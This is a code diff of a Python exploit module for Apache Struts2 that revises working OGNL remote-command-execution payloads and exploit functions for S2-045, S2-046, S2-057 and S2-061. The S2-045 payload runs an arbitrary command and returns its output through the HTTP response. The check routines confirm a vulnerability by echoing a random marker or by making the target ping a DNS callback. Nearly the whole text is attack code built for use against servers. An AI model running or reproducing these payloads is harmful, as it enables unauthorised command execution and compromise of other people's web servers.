@@ -105,21 +105,19 @@ class ApacheStruts2():
                                "(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter"
                                "(%23parameters.pp%5B0%5D),%23str%3D%23s.hasNext()%3F%23s.next()%3A%23parameters.ppp%5B0%5D,%23w."
                                "print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=RECOMMAND&pp=____A&ppp=%20&encoding=UTF-8")
-
-        self.payload_s2_045 = r"%{(#toolslogo='multipart/form-data').(#dm=@ogn" \
-                              r"l.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_member" \
-                              r"Access=#dm):((#container=#context['com.opensymphony.xwork2.Act" \
-                              r"ionContext.container']).(#ognlUtil=#container.getInstance(@com" \
-                              r".opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExclu" \
-                              r"dedPackageNames().clear()).(#ognlUtil.getExcludedClasses().cle" \
-                              r"ar()).(#context.setMemberAccess(#dm)))).(#cmd='RECOMMAND').(#i" \
-                              r"swin=(@java.lang.System@getProperty('os.name').toLowerCase().c" \
-                              r"ontains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/b" \
-                              r"ash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p" \
-                              r".redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org." \
-                              r"apache.struts2.ServletActionContext@getResponse().getOutputStr" \
-                              r"eam())).(@org.apache.commons.io.IOUtils@copy(#process.getInput" \
-                              r"Stream(),#ros)).(#ros.flush())}"
+        self.payload_s2_045 = r"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." \
+                              r"(#_memberAccess?(#_memberAccess=#dm):" \
+                              r"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." \
+                              r"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." \
+                              r"(#ognlUtil.getExcludedPackageNames().clear())." \
+                              r"(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))." \
+                              r"(#req=@org.apache.struts2.ServletActionContext@getRequest())." \
+                              r"(#res=@org.apache.struts2.ServletActionContext@getResponse())." \
+                              r"(#res.setContentType('text/html;charset=UTF-8'))." \
+                              r"(#s=new java.util.Scanner((new java.lang.ProcessBuilder" \
+                              r"('RECOMMAND'.toString().split('\\s'))).start().getInputStream()).useDelimiter('\\AAAA'))." \
+                              r"(#str=#s.hasNext()?#s.next():'').(#res.getWriter().print(#str))." \
+                              r"(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())}"
         self.payload_s2_046 = '''-----------------------------\r\n ''' \
                               '''Content-Disposition: form-data; name=\"foo\"; filename=\"%{''' \
                               '''(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_M''' \
@@ -534,68 +532,39 @@ class ApacheStruts2():
         self.vul_info["vul_type"] = "remote command execution"
         self.vul_info["vul_data"] = "null"
         self.vul_info["vul_desc"] = "Possible Remote Code Execution when performing file upload based on Jakarta Multipart parser."
-        self.vul_info["cre_date"] = "2021-01-30"
+        self.vul_info["cre_date"] = "2021-02-26"
         self.vul_info["cre_auth"] = "zhzyker"
         md = random_md5()
         cmd = "echo " + md
-        self.page = "null"
-        self.vuln_number = 0
-        self.method = "get"
-        self.headers1 = {
+        headers_1 = {
+            'User-Agent': self.ua,
+            'Content-Type': self.payload_s2_045.replace("RECOMMAND", cmd)
+        }
+        headers_2 = {
             'User-Agent': self.ua,
             'Content-Type': '${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].'
                             'addHeader("FUCK",233*233)}.multipart/form-data'
         }
-        self.headers2 = {
-            'User-Agent': self.ua,
-            'Content-Type': self.payload_s2_045.replace("RECOMMAND", cmd)
-        }
         try:
-            self.req = requests.get(self.url, headers=self.headers1, timeout=self.timeout, verify=False)
-            if r"54289" in self.request.headers['FUCK']:
-                vuln_number = 1
-                self.fuck045 = self.request.headers['FUCK']
-                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
+            self.request = requests.post(self.url, headers=headers_1, timeout=self.timeout, verify=False)
+            if md in misinformation(self.request.text, md):
+                self.vul_info["vul_data"] = dump.dump_all(self.request).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
-                self.vul_info["vul_payd"] = '${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("FUCK",233*233)}.multipart/form-data'
-                self.vul_info["prt_info"] = "[rce] [cmd: 233*233]"
-                verify.scan_print(self.vul_info)
+                self.vul_info["vul_payd"] = self.payload_s2_045.replace("RECOMMAND", cmd)
+                self.vul_info["prt_info"] = "[rce] [cmd:" + cmd + "]"
             else:
-                try:
-                    self.request = urllib.request.Request(self.url, headers=self.headers2)
-                    self.page = urllib.request.urlopen(self.request, timeout=self.timeout).read()
-                except http.client.IncompleteRead as error:
-                    self.page = error.partial
-                except Exception as error:
-                    self.text045 = str(error)
-                    if r"timed out" in self.text045:
-                        verify.timeout_print(self.vul_info["prt_name"])
-                    elif r"Connection refused" in self.text045:
-                        verify.connection_print(self.vul_info["prt_name"])
-                    else:
-                        if md in misinformation(self.text045, md):
-                            self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
-                            self.vul_info["prt_resu"] = "PoCSuCCeSS"
-                            self.vul_info["vul_payd"] = '${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("FUCK",233*233)}.multipart/form-data'
-                            self.vul_info["prt_info"] = "[rce] [cmd: 233*233]"
-                            verify.scan_print(self.vul_info)
-                try:
-                    self.r = self.page.decode("utf-8")
-                except:
-                    self.r = self.page.decode("gbk")
-                else:
-                    self.r = bytes.decode(self.page)
-                    if md in misinformation(self.r, md):
-                        self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
-                        self.vul_info["prt_resu"] = "PoCSuCCeSS"
-                        self.vul_info["vul_payd"] = self.payload
-                        self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
-                    verify.scan_print(self.vul_info)
+                self.request = requests.post(self.url, headers=headers_2, timeout=self.timeout, verify=False)
+                if r"54289" in self.request.headers['FUCK']:
+                    self.vul_info["vul_data"] = dump.dump_all(self.request).decode('utf-8', 'ignore')
+                    self.vul_info["prt_resu"] = "PoCSuCCeSS"
+                    self.vul_info["vul_payd"] = '${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("FUCK",233*233)}.multipart/form-data'
+                    self.vul_info["prt_info"] = "[rce] [cmd: 233*233]"
+            verify.scan_print(self.vul_info)
         except requests.exceptions.Timeout:
             verify.timeout_print(self.vul_info["prt_name"])
         except requests.exceptions.ConnectionError:
             verify.connection_print(self.vul_info["prt_name"])
-        except Exception as e:
+        except Exception:
             verify.error_print(self.vul_info["prt_name"])
         self.threadLock.release()
 
@@ -757,20 +726,16 @@ class ApacheStruts2():
                                     "package have no or wildcard namespace."
         self.vul_info["cre_date"] = "2021-01-30"
         self.vul_info["cre_auth"] = "zhzyker"
-        md = random_md5()
-        cmd = "echo " + md
+        md = dns_request()
+        cmd = "ping " + md
         self.payload = self.payload_s2_057.replace("RECOMMAND", cmd)
         try:
             self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
-            self.page = self.req.text
-            self.etree = html.etree
-            self.page = self.etree.HTML(self.page)
-            self.data = self.page.xpath('//footer/div[1]/p[1]/a[1]/@*')
-            if md in misinformation(self.data, md):
+            if dns_result():
                 self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
                 self.vul_info["vul_payd"] = self.payload
-                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
+                self.vul_info["prt_info"] = "[dns] [cmd: " + cmd + "]"
             verify.scan_print(self.vul_info)
         except requests.exceptions.Timeout:
             verify.timeout_print(self.vul_info["prt_name"])
@@ -839,21 +804,18 @@ class ApacheStruts2():
                                     " may lead to remote code execution."
         self.vul_info["cre_date"] = "2021-01-30"
         self.vul_info["cre_auth"] = "zhzyker"
-        md = random_md5()
-        cmd = "echo " + md
+        md = dns_request()
+        cmd = "ping " + md
         self.payload = self.payload_s2_061.replace("RECOMMAND", cmd)
         if r"?" not in self.url:
             self.url_061 = self.url + "?id="
         try:
             self.req = requests.get(self.url_061 + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
-            self.page = self.req.text
-            self.page = etree.HTML(self.page)
-            self.r = self.page.xpath('//a[@id]/@id')[0]
-            if md in misinformation(self.r, md):
+            if dns_result():
                 self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
                 self.vul_info["vul_payd"] = self.payload
-                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
+                self.vul_info["prt_info"] = "[dns] [cmd: " + cmd + "]"
             verify.scan_print(self.vul_info)
         except requests.exceptions.Timeout:
             verify.timeout_print(self.vul_info["prt_name"])
@@ -1017,48 +979,19 @@ class ApacheStruts2():
 
     def s2_045_exp(self, cmd):
         vul_name = "Apache Struts2: S2-045"
-        self.page = "null"
-        self.vuln_number = 0
-        self.method = "get"
-        self.headers1 = {
-            'User-Agent': self.ua,
-            'Content-Type': '${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].'
-                            'addHeader("FUCK",233*233)}.multipart/form-data'
-        }
-        self.headers2 = {
+        headers = {
             'User-Agent': self.ua,
             'Content-Type': self.payload_s2_045.replace("RECOMMAND", cmd)
         }
         try:
-            self.req = requests.get(self.url, headers=self.headers1, timeout=self.timeout, verify=False)
+            self.req = requests.post(self.url, headers=headers, timeout=self.timeout, verify=False)
             self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
-            try:
-                self.request = urllib.request.Request(self.url, headers=self.headers2)
-                self.page = urllib.request.urlopen(self.request, timeout=self.timeout).read()
-            except http.client.IncompleteRead as error:
-                self.page = error.partial
-                self.r = self.page.decode("utf-8")
-                verify.exploit_print(self.r, self.raw_data)
-            except Exception as error:
-                self.text045 = str(error)
-                if r"timed out" in self.text045:
-                    verify.timeout_print(self.vul_info["prt_name"])
-                elif r"Connection refused" in self.text045:
-                    verify.connection_print(self.vul_info["prt_name"])
-                else:
-                    verify.exploit_print(self.text045, self.raw_data)
-            try:
-                self.r = self.page.decode("utf-8")
-            except:
-                self.r = self.page.decode("gbk")
-            else:
-                self.r = bytes.decode(self.page)
-            verify.exploit_print(self.r, self.raw_data)
+            verify.exploit_print(self.req.text, self.raw_data)
         except requests.exceptions.Timeout:
             verify.timeout_print(vul_name)
         except requests.exceptions.ConnectionError:
             verify.connection_print(vul_name)
-        except Exception:
+        except Exception as e:
             verify.error_print(vul_name)
 
     def s2_046_exp(self, cmd):
@@ -1124,12 +1057,9 @@ class ApacheStruts2():
         self.payload = self.payload_s2_057.replace("RECOMMAND", cmd)
         try:
             self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
-            self.page = self.req.text
-            self.etree = html.etree
-            self.page = self.etree.HTML(self.page)
-            self.data = self.page.xpath('//footer/div[1]/p[1]/a[1]/@*')
+            r = "Command Executed Successfully (But No Echo)"
             self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
-            verify.exploit_print(self.data, self.raw_data)
+            verify.exploit_print(r, self.raw_data)
         except requests.exceptions.Timeout:
             verify.timeout_print(vul_name)
         except requests.exceptions.ConnectionError:
@@ -1160,11 +1090,9 @@ class ApacheStruts2():
             self.url_061 = self.url + "?id="
         try:
             self.req = requests.get(self.url_061 + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
-            self.page = self.req.text
-            self.page = etree.HTML(self.page)
-            self.r = self.page.xpath('//a[@id]/@id')[0]
+            r = "Command Executed Successfully (But No Echo)"
             self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
-            verify.exploit_print(self.r, self.raw_data)
+            verify.exploit_print(r, self.raw_data)
         except requests.exceptions.Timeout:
             verify.timeout_print(vul_name)
         except requests.exceptions.ConnectionError:
